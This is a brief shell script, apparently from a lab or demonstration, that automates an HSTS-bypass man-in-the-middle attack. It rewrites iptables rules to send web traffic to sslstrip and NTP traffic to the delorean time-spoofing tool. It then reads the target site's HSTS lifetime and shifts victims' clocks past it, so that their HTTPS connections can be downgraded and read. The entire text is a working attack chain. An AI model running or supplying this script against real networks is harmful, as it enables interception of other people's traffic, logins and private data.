#!/bin/sh

PROXY_PORT=4242
DELOREAN_PORT=4343

iptables -t nat -F
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port $PROXY_PORT
iptables -t nat -A PREROUTING -p udp --destination-port 123 -j REDIRECT --to-port $DELOREAN_PORT

hsts_expire=$(curl -v https://www.opeth.secure --insecure 2>&1  | grep Strict | awk -F= '{print $2}' | awk -F\; '{print $1}')
hsts_expire=$(($hsts_expire / (1000 * 60) + 1))

/mnt/host/delorean.py -p $DELOREAN_PORT -n -s $hsts_expire &
/mnt/host/sslstrip.py $PROXY_PORT
